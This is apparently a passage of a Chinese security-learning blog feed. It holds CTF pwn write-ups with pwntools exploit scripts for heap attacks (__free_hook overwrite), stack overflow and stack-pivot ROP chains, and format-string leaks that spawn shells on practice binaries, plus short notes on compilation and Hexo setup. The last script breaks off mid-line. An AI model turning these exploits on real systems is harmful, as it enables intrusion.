class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(str(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">########################################unsorted bin attack#####################################</span></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena = u64(sh.recvuntil(<span class="string">'\n'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-88</span></span><br><span class="line">log.success(<span class="string">'main_arena='</span>+hex(main_arena))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">__malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_addr = __malloc_hook - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_addr + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line"></span><br><span class="line">__free_hook = libc_addr + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">log.success(<span class="string">'__free_hook='</span>+hex(__free_hook))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">payload = p64(main_arena) + p64(__free_hook - <span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">###################################fasted bin attack ###########################################</span></span><br><span class="line">fastbin_attack = __free_hook - (<span class="number">0x33</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(fastbin_attack))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(system))</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="三"><a href="#三" class="headerlink" title="三"></a>三</h3><p>漏洞点在</p><p>若输入负数，则read的size位便极大，使得允许栈溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">bss = <span class="number">0x0804A040</span></span><br><span class="line">main_addr = <span class="number">0x08048668</span></span><br><span class="line">system_addr = <span class="number">0x0804865D</span></span><br><span class="line">pop3_ret = <span class="number">0x08048779</span></span><br><span class="line">sh = process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment">#######################write bss######################</span></span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'20'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'-1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x5c</span>+<span class="number">0x4</span>)</span><br><span class="line"><span class="comment">#payload += p32(0x0804864F)</span></span><br><span class="line">payload += p32(elf.plt[<span class="string">'read'</span>]) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(bss) + p32(<span class="number">8</span>) +p32(main_addr)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#########################get shell####################</span></span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'20'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'-1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x5c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(system_addr)+p32(<span class="number">0x0</span>)+p32(bss)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="五"><a href="#五" class="headerlink" title="五"></a>五</h3><p>漏洞点在格式化字符串漏洞，那么就有两种解题的办法</p><h4 id="第一种：50-概率的"><a href="#第一种：50-概率的" class="headerlink" title="第一种：50%概率的"></a>第一种：50%概率的</h4><p>为什么只有50%呢，因为会随机出负数鸭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process("./pwn")</span></span><br><span class="line">sh = remote(<span class="string">"node2.buuoj.cn.wetolink.com"</span>, <span class="number">28695</span>)</span><br><span class="line"></span><br><span class="line">suiji_addr = <span class="number">0x0804C044</span></span><br><span class="line">offset = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.send(p32(suiji_addr) + <span class="string">"%10$s"</span>)</span><br><span class="line"><span class="comment">#sh.recvuntil(".")</span></span><br><span class="line">sh.recvuntil(<span class="string">'\x08'</span>)</span><br><span class="line">suiji = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> suiji</span><br><span class="line"><span class="keyword">print</span> hex(suiji)</span><br><span class="line"><span class="keyword">print</span> int(suiji)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"passwd"</span>)</span><br><span class="line">sh.sendline(str(suiji))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="第二种：100-概率的"><a href="#第二种：100-概率的" class="headerlink" title="第二种：100%概率的"></a>第二种：100%概率的</h4><p>这就是反向写入了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fsb</span><span class="params">(payload)</span>:</span></span><br><span class="line">    sh.sendafter(<span class="string">"your name:"</span>,payload)</span><br><span class="line">target=<span class="number">0x804C044</span></span><br><span class="line">payload=p32(target)+<span class="string">"%10$n"</span></span><br><span class="line">fsb(payload)</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">"your passwd:"</span>,<span class="string">"4"</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一&quot;&gt;&lt;a href=&quot;#一&quot; class=&quot;headerlink&quot; title=&quot;一&quot;&gt;&lt;/a&gt;一&lt;/h3&gt;&lt;p&gt;首先ida查看，是一个标准的堆题&lt;/p&gt;
&lt;p&gt;查看delete，uaf漏洞&lt;/p&gt;
&lt;p&gt;那么自然是fasted bin attack + uns
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>程序员的自我修养（整理）</title>
    <link href="http://yoursite.com/2019/10/18/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%88%E6%95%B4%E7%90%86%EF%BC%89/"/>
    <id>http://yoursite.com/2019/10/18/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%88%E6%95%B4%E7%90%86%EF%BC%89/</id>
    <published>2019-10-18T04:23:45.190Z</published>
    <updated>2020-02-25T10:53:31.787Z</updated>
    
    <content type="html"><![CDATA[<h3 id="编译与链接"><a href="#编译与链接" class="headerlink" title="编译与链接"></a>编译与链接</h3><p>在linux下，使用gcc编译程序的时候，需要经历四步过程，分别是预处理，编译，汇编和链接</p><h4 id="编译器流程"><a href="#编译器流程" class="headerlink" title="编译器流程"></a>编译器流程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">A[Source Code] --&gt;|Scanner| B(Tokens)</span><br><span class="line">B --&gt; |Parser| C(Syntax Tree)</span><br><span class="line">C --&gt; |Semantic Analyzer| D(Commented Syntax Tree)</span><br><span class="line">D --&gt; |Source Code Optimizer| E(Intermediate Representation)</span><br><span class="line">E --&gt; |Code Generator| F(Target Code)</span><br><span class="line">F --&gt; |Code Optimizer| G(Final Target Code)</span><br></pre></td></tr></table></figure><h4 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h4><p>预处理过程主要处理源代码中以“#”开始的预编译指令。比如“#include”，“#define”等，主要处理规则如下：</p><ol><li>将所有的“#define”删除，并且展开所有的宏定义。</li><li>处理所有条件预编译指令，比如：“#if”，“#ifdef”，“#elif”，“#else”，”#endif”。</li><li>处理“#include”预编译指令，将被包含的文件插入到该预编译指令的位置，注意，这个过程是递归进行的，也就是说被包含的文件可能还包含其他文件。</li><li>删除所有的注释“\\“和”/**/“。</li><li>添加行号和文件标识名，比如#2”hello.c“ 2，以便于编译时编译器产生调试用的行号信息以及用于编译时产生编译错误或警告时能够显示行号.</li><li>保留所有的#prcagma编译器指令，因为编译器需要使用它们。</li></ol><p>经过预处理的.i文件不包含任何宏定义，因为所有的宏已经被展开。</p><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>编译过程就是把预处理完的文件进行一系列词法分析，语法分析，语义分析以及优化后生产相应的汇编代码。</p><p>举一个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">array</span>[index] = (index + <span class="number">4</span>) * (<span class="number">2</span>+<span class="number">6</span>)</span><br><span class="line">CompilerExpression.c</span><br></pre></td></tr></table></figure><h4 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h4><p>源代码程序被输入到扫描器，运用类似于有限状态机的算法将源代码的字符序列分割成一系列的记号（token）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">记号(token)分为如下几类：关键字，标识符，字面量（包含数字，字符串等）和特殊符号（如加号，等号）</span><br></pre></td></tr></table></figure><p>识别记号的同时，扫描器也完成了其他工作，例如将标识符存放到符号表，将数字，字符串常量存到文字表等。</p><p>lea程序实现词法扫描，按照用户之前描述好的词法规则，将输入的字符串分割成一个个记号。</p><h4 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h4><p>语法分析器对由扫描器产生的记号进行语法分析，从而产生语法树（以表达式为节点的树）。整个过程采用了上下文无关语法。</p><p>在语法分析的同时，运算符号的优先级和含义也被确定。</p><p>如果出现了表达式不合法，比如各种括号不匹配，表达式中缺少操作符等，编译器就会报告语法分析阶段的错误。（语法分析，也就是检测表达式格式正确与否）</p><p>yacc工具根据给定的语法规则，生成语法树。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">A[Assign Expression =] --&gt;B(Subscript Expression )</span><br><span class="line">A[Assign Expression =] --&gt;C(Multiplicativer Expression *)</span><br><span class="line">B(Subscript Expression ) --&gt; D(Identifier array)</span><br><span class="line">B(Subscript Expression ) --&gt; F(Identifier Index)</span><br><span class="line">C(Multiplicativer Expression *) --&gt; G(Addtive Expression +)</span><br><span class="line">C(Multiplicativer Expression *) --&gt; H(Addtive Expression +)</span><br><span class="line">G(Addtive Expression +) --&gt; I(Identifier Index)</span><br><span class="line">G(Addtive Expression +) --&gt; J(Number 4)</span><br><span class="line">H(Addtive Expression +) --&gt; K(Number 2)</span><br><span class="line">H(Addtive Expression +) --&gt; L(Number 6)</span><br></pre></td></tr></table></figure><h4 id="语义分析"><a href="#语义分析" class="headerlink" title="语义分析"></a>语义分析</h4><p>检测这个表达式是否真的有意义。例如两个指针做乘法运算是没有意义的，但是在语法分析里，语法上是合法的。</p><p>编译器所能分析的语义是静态语义（staticSemantic），所谓静态语义是指在编译期可以确定的语义。包括声明和类型的匹配，类型的转换。</p><p>与之对应的是动态语义，只有在运行期才能确定。</p><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><p>汇编器将汇编代码转为机器码的过程</p><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>菜鸡写不出来，呜呜，还是等详细看完再写吧</p><p><img src="C:%5CUsers%5Czhz%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200225185321610.png" alt="image-20200225185321610"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;编译与链接&quot;&gt;&lt;a href=&quot;#编译与链接&quot; class=&quot;headerlink&quot; title=&quot;编译与链接&quot;&gt;&lt;/a&gt;编译与链接&lt;/h3&gt;&lt;p&gt;在linux下，使用gcc编译程序的时候，需要经历四步过程，分别是预处理，编译，汇编和链接&lt;/p&gt;
&lt;h4 id=&quot;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>搭建博客的一些坑</title>
    <link href="http://yoursite.com/2019/10/18/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/"/>
    <id>http://yoursite.com/2019/10/18/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/</id>
    <published>2019-10-18T04:23:45.165Z</published>
    <updated>2019-10-03T14:48:55.147Z</updated>
    
    <content type="html"><![CDATA[<p>根据此链接进行博客的搭建<a href="https://blog.csdn.net/weixin_39879178/article/details/80319392" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39879178/article/details/80319392</a><br>但是其中踩了不少的坑，发现此链接中有些图片存在些许问题</p><p><strong>1.在进行hexo init的时候</strong><br><img src="https://img-blog.csdnimg.cn/20191003223041562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poel9fX18=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>实际上，你不应该在根目录进行hexo init操作，而是应该进入你的blog/Hexo文件里进行 hexo init操作。<br>不然，你就会出现hexo no found。</p><p><strong>2.在进行添加分类链接的时候</strong><br>网上很多博客都是直接让你new page一个categories，但是请注意！！！！！<br><img src="https://img-blog.csdnimg.cn/20191003223424930.png" alt="在这里插入图片描述"><br>先观察你的github文件夹里categories里的大小写，根据大小写来修改D:\blog\Hexo\themes\next里的_config.yml文件夹里的categories选项。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;根据此链接进行博客的搭建&lt;a href=&quot;https://blog.csdn.net/weixin_39879178/article/details/80319392&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.csdn.net
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>对于栈迁移技术的学习</title>
    <link href="http://yoursite.com/2019/10/18/%E5%AF%B9%E4%BA%8E%E6%A0%88%E8%BF%81%E7%A7%BB%E6%8A%80%E6%9C%AF%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2019/10/18/%E5%AF%B9%E4%BA%8E%E6%A0%88%E8%BF%81%E7%A7%BB%E6%8A%80%E6%9C%AF%E7%9A%84%E5%AD%A6%E4%B9%A0/</id>
    <published>2019-10-18T04:23:44.493Z</published>
    <updated>2020-04-27T15:21:24.349Z</updated>
    
    <content type="html"><![CDATA[<h3 id="migration"><a href="#migration" class="headerlink" title="migration"></a>migration</h3><p>栈迁移其实就是利用 leave ret<br>因为 leave ret 实际上就是  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov    esp  ebp</span><br><span class="line">       pop  ebp  //将栈中esp的值弹给ebp~</span><br><span class="line">       pop  eip  //一种清栈的行为，同时控制程序流~</span><br></pre></td></tr></table></figure><p>简单来说，进行了两次的leave操作。(程序本身一次，你自己构造的一次)mov esp,ebp; pop ebp; mov esp,ebp; pop ebp。</p><p>第一次的leave操作将esp指向ebp基址，ebp指向栈中伪造的ebp处。</p><p>第二次的leave操作将esp指向伪造的ebp处（和汇编中开辟栈空间一样，ebp与esp先同时指向一个地方，然后填充(esp-4)）最后的pop ebp会导致esp+4，所以我们需要构造的时候将数据放到esp+4的地方。</p><p>这是我手动进行的栈迁移，但是…不知道为什么，puts接收数据接收不到，望大佬指正</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">'./migration'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./migration'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">buf = elf.bss() + <span class="number">0x500</span></span><br><span class="line">buf2 = elf.bss() + <span class="number">0x400</span></span><br><span class="line">leave_ret = <span class="number">0x08048418</span></span><br><span class="line"></span><br><span class="line">pop1_ret = <span class="number">0x0804836d</span></span><br><span class="line">pop3_ret = <span class="number">0x08048569</span></span><br><span class="line"><span class="comment">#################### change stack space#####################</span></span><br><span class="line">sh.recv()</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span> + p32(buf) + p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(buf) + p32(<span class="number">0x100</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="comment">#################### leak libc address ########################</span></span><br><span class="line">payload1 = p32(buf2) + p32(puts_plt) + p32(pop1_ret) + p32(puts_got) + p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(buf2) + p32(<span class="number">0x100</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">puts_add = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = puts_add - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc base address--&gt;[%s]"</span>%hex(libc_base)</span><br><span class="line">system_add = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system address --&gt;[%s]"</span>%hex(system_add)</span><br><span class="line"><span class="comment">######################  get shell ###########################</span></span><br><span class="line">payload = p32(buf) + p32(read_plt) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(buf) + p32(<span class="number">0x100</span>) + p32(system_add) + <span class="string">'bbbb'</span> + p32(buf)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>ps：找到问题所在了，第一次需要send，sendline多了’\x0a’，好像就出现问题了</p><p>下面是利用rop模块进行的，这就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#! -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./migration'</span>)</span><br><span class="line">elf = ELF(<span class="string">'migration'</span>)</span><br><span class="line"></span><br><span class="line">read_plt = <span class="number">0x8048380</span></span><br><span class="line">puts_plt = <span class="number">0x8048390</span></span><br><span class="line">leave_ret = <span class="number">0x08048418</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0804836d</span></span><br><span class="line">puts_got = <span class="number">0x8049ff0</span></span><br><span class="line"><span class="comment">#buf = 0x0804b000-0x200</span></span><br><span class="line"><span class="comment">#buf2 = buf + 0x100</span></span><br><span class="line">buf = elf.bss() + <span class="number">0x500</span></span><br><span class="line">buf2 = elf.bss() + <span class="number">0x400</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">40</span></span><br><span class="line">payload += flat([buf,read_plt,leave_ret,<span class="number">0</span>,buf,<span class="number">100</span>])</span><br><span class="line">sh.recvuntil(<span class="string">":"</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">rop = flat([buf2,puts_plt,pop_edx_ret,puts_got,read_plt,leave_ret,<span class="number">0</span>,buf2,<span class="number">100</span>])</span><br><span class="line"></span><br><span class="line">sh.sendline(rop)</span><br><span class="line">sh.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">puts_off = <span class="number">0x5fca0</span></span><br><span class="line">libc = u32(r.recv(<span class="number">4</span>)) - puts_off</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc:"</span>,hex(libc)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">system_off = <span class="number">0x3ada0</span></span><br><span class="line">system = libc + system_off</span><br><span class="line">rop2 = flat([buf,system,<span class="number">0</span>,buf2+<span class="number">16</span>,<span class="string">"/bin/sh"</span>])</span><br><span class="line">sh.sendline(rop2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="spwn"><a href="#spwn" class="headerlink" title="spwn"></a>spwn</h3><p>这题，怎么说呢，学艺不精，在最后进行read读入的时候，我忘记加上leave_ret，将程序流劫持到read(addr)地方了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./spwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./spwn'</span>)</span><br><span class="line">libc = ELF(<span 